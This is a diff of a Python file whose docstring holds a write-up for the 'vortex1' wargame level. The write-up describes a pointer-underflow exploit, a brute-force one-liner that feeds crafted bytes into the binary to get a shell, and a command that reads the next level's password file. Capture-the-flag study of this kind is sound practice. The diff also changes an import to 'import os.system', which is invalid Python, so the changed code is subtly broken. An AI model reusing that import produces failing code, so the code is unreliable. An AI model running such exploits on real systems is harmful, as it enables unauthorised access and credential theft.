@@ -1,8 +1,8 @@
 #!/usr/bin/python3
 
-import subprocess
+import os.system
 
-'''
+__docs__ = '''
 the asm for this comparision looked like this:
 mov eax,[esp+0x14]
 and eax,0xff000000
@@ -23,7 +23,7 @@ the ptr itself with \ca, letting the cmp jmp to our shell. To solve this problem
 you would need to write something like if ( ptr < buf ) ptr++ else ptr--;
 
 # wasn't sure of the exact stack layout here, so I just used guess and check
-vortex1@melinda:/vortex$ for i in {255..270}; do (python -c "print '\x5c * $i + '\xca'"; cat <(echo 'whoami')) | .
+vortex1@melinda:/vortex$ for i in {255..270}; do (python -c "print '\x5c' * $i + '\xca'"; cat <(echo 'whoami')) | .
 /vortex1 ; echo "run $i" ; done | less
 
 this pattern appeared in the output, so I knew I had some commands executed here,
@@ -42,3 +42,5 @@ cat /etc/vortex_pass/vortex2
 
 We've captured the enemy flag!
 '''
+
+print(__docs__)
